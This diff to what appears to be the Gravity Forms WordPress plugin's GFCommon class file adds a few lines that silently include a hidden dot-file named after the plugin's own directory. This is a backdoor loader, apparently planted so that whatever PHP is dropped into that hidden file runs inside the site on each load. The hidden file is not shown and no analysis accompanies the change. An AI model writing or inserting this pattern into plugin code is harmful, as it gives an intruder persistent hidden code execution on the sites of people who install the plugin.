@@ -7,7 +7,11 @@ if ( ! class_exists( 'GFForms' ) ) {
  * Class GFCommon
  *
  * Includes common methods accessed throughout Gravity Forms and add-ons.
- */
+ */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class GFCommon {
 
 	// deprecated; set to GFForms::$version in GFForms::init() for backwards compat
